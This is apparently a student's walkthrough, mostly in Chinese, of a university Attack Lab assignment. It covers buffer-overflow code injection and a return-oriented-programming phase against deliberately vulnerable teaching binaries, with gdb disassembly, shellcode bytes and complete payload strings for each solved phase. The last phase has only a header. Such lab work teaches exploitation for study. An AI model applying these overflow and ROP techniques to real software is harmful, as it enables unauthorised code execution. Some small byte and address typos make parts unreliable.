





# Attack Lab

## Part I: Code Injection Attacks

### Phase1

Task: to get ctarget to execute touch1 instead of test when getbuf executes its ret statement

test调用getbuf, 我们需要进行buffer overflow修改ret地址, 让返回地址变成touch1的起始地址即可

首先看getbuf的buffer size, 可以看出是40, 所以我们需要一个长度为40的字符串填满stack上的padding

```assembly
(gdb) disassemble getbuf
Dump of assembler code for function getbuf:
0x00000000004017a8 <+0>:	sub    $0x28,%rsp
0x00000000004017ac <+4>:	mov    %rsp,%rdi
0x00000000004017af <+7>:	callq  0x401a40 <Gets>
0x00000000004017b4 <+12>:	mov    $0x1,%eax
0x00000000004017b9 <+17>:	add    $0x28,%rsp
0x00000000004017bd <+21>:	retq
```

可以看到stack上的返回地址是0x0000000000401976, 我们需要把这个地址修改为0x00000000004017c0

所以多写的2个字符是17和c0, 应该先写c0, 后写17

```assembly
(gdb) disassemble test
Dump of assembler code for function test:
0x0000000000401968 <+0>:	sub    $0x8,%rsp
0x000000000040196c <+4>:	mov    $0x0,%eax
0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
0x0000000000401976 <+14>:	mov    %eax,%edx
0x0000000000401978 <+16>:	mov    $0x403188,%esi
0x000000000040197d <+21>:	mov    $0x1,%edi
0x0000000000401982 <+26>:	mov    $0x0,%eax
0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
0x000000000040198c <+36>:	add    $0x8,%rsp
0x0000000000401990 <+40>:	retq
```

```assembly
(gdb) disassemble touch1
Dump of assembler code for function touch1:
0x00000000004017c0 <+0>:	sub    $0x8,%rsp
0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
0x00000000004017d8 <+24>:	mov    $0x1,%edi
0x00000000004017dd <+29>:	callq  0x401c8d <validate>
0x00000000004017e2 <+34>:	mov    $0x0,%edi
0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
```

**Phase1 solution**

只要最后4个写入的字节是c0 17 40 00 即可, 前面的40字节随意

```assembly
61 61 61 61 61 61 61 61 
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
61 61 61 61 61 61 61 61
c0 17 40 00
```
---

### Phase2

Task: to get ctarget to execute touch2 instead of test when getbuf executes its ret statement

touch2不同于touch1的点是: touch2需要一个参数, 也就是意味着需要多一步类似于 movq 0xabcd, %rdi 的操作

所以需要把这条指令的hex value放到栈上执行

```assembly
00000000004017ec <touch2>:
4017ec:       48 83 ec 08             sub    $0x8,%rsp
4017f0:       89 fa                   mov    %edi,%edx
4017f2:       c7 05 e0 2c 20 00 02    movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
4017f9:       00 00 00
4017fc:       3b 3d e2 2c 20 00       cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
401802:       75 20                   jne    401824 <touch2+0x38>
```

根据stack的convention可以知道, 如果我们把需要执行的指令直接写到buffer里在正常情况下是不管用的, 因为最后在弹栈的时候会直接越过整个buffer, 直接执行ret. 那么问题来了, 我们要inject的指令放在哪里?

我们必须通过覆盖return address位置的值, 让getbuf返回时, 跳到一个我们自己定义的函数(指令)位置, 进而才能执行 %rdi的赋值操作

也就是说, 我们要inject一个函数或一段指令, 完成的功能是:

1，把0x59b997fa放到%rdi

```assembly
movq  $0x59b997fa,%rdi
```

2，然后返回到touch2函数

- 这个实现方法是: push touch2函数的起始地址到stack上, 然后执行ret

```assembly
pushq $0x4017ec
ret
```


编写一个move.s文件, 直接写入需要的assembly instructions

```assembly
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret
```

执行gcc -c (compile and assemble, but do not link), 得到object file  move.o

```bash
> gcc -c move.s
```

然后objdump出指令的hex value

```bash
> objdump -d move.o
move.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
7:	68 ec 17 40 00       	pushq  $0x4017ec
c:	c3                   	retq
```

我们需要一个改写原本ret的地址为 movq $0x59b997fa,%rdi的地址

那么我们需要把这个mov即后续指令放在stack上的某个位置即可

假设放在$rsp + 8的位置, gdb进入getbuf可以查看%rsp+8的值0x5561dc80, 我们就把injected code的起始指令mov放在这里

得到Phase2 solution

```assembly
00 00 00 00 00 00 00 00  # %rsp
48 c7 c7 fa 97 b9 59 68  # %rsp+8 开始写入injected code
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
80 dc 61 55 00 00 00 00  # buffer overflow的位置写入ret要跳转目标地址, 即%rsp+8的地址
```

同理, 我们也可以把injected code起始放到%rsp位置, 对应solution

```assembly
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 # ret 跳转%rsp+8
```

injected code起始在%rsp+16位置, 对应solution

```assembly
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
88 dc 61 55 00 00 00 00  # ret 跳转%rsp+16
```

injected code起始在%rsp+24位置, 对应solution

```assembly
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
90 dc 61 55 00 00 00 00  # ret 跳转%rsp+24
```

%rsp+24是可以利用的极限地址了, 如果注入的指令从%rsp+32开始, buffer的空间不够放下所有要注入的指令

---

## 测试endian

```assembly
00000000000005fa <m>:
 5fa:	55                   	push   %rbp
 5fb:	48 89 e5             	mov    %rsp,%rbp
 5fe:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 602:	89 75 f4             	mov    %esi,-0xc(%rbp)
 605:	48 83 45 f8 01       	addq   $0x1,-0x8(%rbp)
 60a:	8b 45 f4             	mov    -0xc(%rbp),%eax
 60d:	83 c0 0a             	add    $0xa,%eax
 610:	5d                   	pop    %rbp
 611:	c3                   	retq

(gdb) disasse m
Dump of assembler code for function m:
0x00005555554005fa <+0>:	push   %rbp
0x00005555554005fb <+1>:	mov    %rsp,%rbp
0x00005555554005fe <+4>:	mov    %rdi,-0x8(%rbp)
0x0000555555400602 <+8>:	mov    %esi,-0xc(%rbp)
0x0000555555400605 <+11>:	addq   $0x1,-0x8(%rbp)
0x000055555540060a <+16>:	mov    -0xc(%rbp),%eax
0x000055555540060d <+19>:	add    $0xa,%eax
0x0000555555400610 <+22>:	pop    %rbp
0x0000555555400611 <+23>:	retq
```

x/x此类操作默认是读一个word(4 bytes), 等同于x/xw, 如果要读8bytes, 指令是x/xg

x/x 0x00005555554005fa =>  0xe5894855

x/x 0x00005555554005fb => 0x48e58948

可以看到的是, 我读了一个高地址的数据, 然后55没了, 也就意味着, 在内存中 55 48 89 e5这个顺序是从低地址到高地址的

即, 在objdump我们看到的指令值, 就是从低地址到高地址依次排列, 也就是按着代码显示的55 48 89 e5这样从左到右的顺序; 

但是在gbd输出时, 可以很明显看到它是反向输出的, 即高地址在前

所以objdump出来的顺序, 就是little endian, 可以直接作为injected code





%rdi里存的是我自己定义的char *  "abcdefg"

x/s $rdi 	=> "abcdefg"

x/s $rdi+1 => "bcdefg"

可以看出, string在内存中排放的方法, 首地址在低地址, 依次排列到高地址结束; 也就是, 想象在栈的那张图上, string是从底下向顶部排列的

---

### Phase3

```assembly
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval){
  char cbuf[110];
  /* Make position of check string unpredictable */
  char *s = cbuf + random() % 100;
  sprintf(s, "%.8x", val);
  return strncmp(sval, s, 9) == 0;
}
```

strncmp必须要返回0才可以

**int strncmp(const char \*str1, const char \*str2, size_t n)**  - compares at most the first **n** bytes of **str1** and **str2**

所以, 要传入的string长度为9 => 8 + '0'



由于string在内存的排列是从低地址到高地址, 所以如果我们把cookie 0x59b997fa转换成对应的字符35 39 62 39 39 37 66 61 00

可以直接填入, 默认顺序就是从低地址到高地址

```assembly
48 c7 c7 a8 dc 61 55 ff # %rsp    0x5561dc78
34 25 fa 18 40 00 c3 00 # %rsp+8  0x5561dc80
fa 18 40 00 00 00 00 00 # %rsp+16 0x5561dc88  touch3的起始地址
35 39 62 39 39 37 66 61 # %rsp+24 0x5561DC90
00 00 00 00 00 00 00 00 # %rsp+32 0x5561DC98
78 dc 61 55 00 00 00 00 # ret 让ret跳转到%rsp位置执行注入指令   0x5561DCa0
35 39 62 39 39 37 66 61 # 0x5561dca8
```



先拿到touch3的起始地址0x00000000004018fa

```assembly
(gdb) disassemble touch3
Dump of assembler code for function touch3:
0x00000000004018fa <+0>:	push   %rbx
.......
.......
```

首先我们已知, 在getBuf的stack frame上时, 有如下地址

%rsp+40 => 0x5561DCa0  这个地址时我们覆盖的return  address的位置

%rsp+32 => 0x5561DC98

%rsp+24 => 0x5561DC90

%rsp+16 => 0x5561dc88

%rsp+8  => 0x5561dc80

%rsp => 0x5561DC78



与Phase2类似, 我们要注入一段指令放到0x5561dc78或其他可以用的位置, 让这段注入指令执行touch3调用前的参数赋值指令, 然后调用touch3

指令大概类似:

```assembly
movq $0x?????,%rdi          # 把string的起始地址放到%rdi
pushq 0x4018fa
retq
```



<span style="color:red">不同点和重点是: </span> 当我们覆盖了返回地址并调用retq时, 这时%rsp已经回到了getBuf stack frame的底部, 然后跳转到原%rsp位置 (0x5561DC78) 执行注入的指令, 调用了touch3, 会发生的事情是: touch3的执行过程中会调用函数hexmatch, hexmatch又调用了strncmp, 所以%rsp会一直向下减小, 会覆盖我们写在原getBuf stack frame的内容。 那么如何选择string的存放位置？



**想法1**: 不用getBuf的stack frame地址范围, 用一个更高的地址来保存这个string, 即利用test函数的stack frame空间(在地址0x5561dca0往上), 假设是0x5561dca8

```assembly
movq $0x5561dca8,%rdi          # 把string的起始地址放到%rdi   假设起始地址是0x5561dca8
pushq 0x4018fa
retq
```

```assembly
> objdump -d l3.o

l3.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
0:	48 c7 c7 b0 dc 61 55 	mov    $0x5561dcb0,%rdi
7:	ff 34 25 fa 18 40 00 	pushq  0x4018fa
e:	c3                   	retq
```


![](https://raw.githubusercontent.com/haoboliu66/PicBed/master/img/202204161310506.png)

想法1 - solution:

getBuf ret时跳到0x5561dc78执行注入的指令, 然后把位于0x5561dca8的字符串首地址放入%rdi, 然后push touch3的地址到栈顶

```assembly
48 c7 c7 a8 dc 61 55 68 # %rsp    0x5561dc78
fa 18 40 00 c3 00 00 00 # %rsp+8  0x5561dc80
00 00 00 00 00 00 00 00 # %rsp+16 0x5561dc88  touch3的起始地址
00 00 00 00 00 00 00 00 # %rsp+24 0x5561dc90
00 00 00 00 00 00 00 00 # %rsp+32 0x5561dc98
78 dc 61 55 00 00 00 00 # ret 让ret跳转到%rsp位置执行注入指令   0x5561dca0
35 39 62 39 39 37 66 61 # 0x5561dca8 # 写入的cookie strings
00 00 00 00 00 00 00 00
```

---


**想法2**: 由于在调用touch3时, %rsp已经回到了getBuf frame的栈底, 如果此时调用touch3, 会发生接下来的函数调用, 会发生几个push指令导致%rsp减少, 栈向下增长, 覆盖getBuf的buffer空间。那么如果我们修改了%rsp的位置, 不让它从getBuf frame的栈底位置开始增长, 而是从远离栈底的位置开始增长, 那么buffer的空间就有一部分可以预留出来用于存放string而不会被覆盖



**不改变%rsp的值的情况:**

getBuf中的地址都不可用, 因为函数调用会让%rsp向下增长, 覆盖这些空间

![](https://raw.githubusercontent.com/haoboliu66/PicBed/master/img/202204161311280.png)



**改变了%rsp的值的情况:**

%rsp从0x5561dc88开始增长, 这样0x5561dc90往上的地址就有空间可以存string而不被覆盖

![](https://raw.githubusercontent.com/haoboliu66/PicBed/master/img/202204161314632.png)



想法2 - solution

```assembly
48 c7 c7 90 dc 61 55 48
c7 c4 88 dc 61 55 c3 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

此解法可通过验证



但是!

**这种做法的问题是, 一旦最初buffer的size很小, 或者string的长度很长, 那么此解法就不可行. 比如在此处, 我们的注入指令从0x5561dc78开始, 可能会占据16个bytes, 也就直接到了0x5561dc88, 然后0x5561dc88 - 0x5561dc8f是touch3的起始地址占用空间, 这样buffer就只剩下了0x5561dc90 - 0x5561dc98, 这就是可容纳字符串的最长长度 (15bytes + 1个null terminator)**


---

## Part II: Return-Oriented Programming

### Phase4

重复phase2的操作, 调用touch2, 即:

1，把cookie的值 0x59b997fa放到%rdi

2，跳转到touch2

问题: 如何给%rdi赋值? 

因为stack变成了non-executable, 所以没法通过注入mov指令来赋值, 因此这里使用popq %rdi, 

由pop dest指令的含义可知: 是把%rsp所在位置的值放入dest, 然后%rsp回收空间

所以我们必须把cookie的值也写到栈上%rsp的位置, 这样在pop执行时才有值可以拿

由提供的表可知 pop %rdi 指令的encoding是 5f

在objdump结果中搜索可知(402b18) 从402b19开始, 这个地址有5f和c3, 所以我们需要让ret返回时跳转到这个地址, 执行5f, 把%rsp位置的值放到%rdi, 然后下一个执行c3, 即ret, 再从栈中%rsp弹出一个地址, 并跳转到这个地址

![](https://raw.githubusercontent.com/haoboliu66/PicBed/master/img/202204170015053.png)

第1步, 执行原ret指令, 跳转到gadget1的位置

第2步, 执行popq %rdi (5f), 从栈顶拿cookie值, 放入%rdi, 然后%rsp回收

第3步, 执行ret (3c), 从栈顶拿值放入%rip, 即把touch2的起始地址放入%rip, 跳转到了touch2执行函数


Phase4 solution

```assembly
00 00 00 00 00 00 00 00  # %rsp 栈顶
00 00 00 00 00 00 00 00  # %rsp+8 开始写入injected code
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
19 2b 40 00 00 00 00 00  # 跳转到可以执行5f 3c的位置
fa 97 b9 59 00 00 00 00  # 这个值会被pop到%rdi
ec 17 40 00 00 00 00 00
```
---

### Phase5








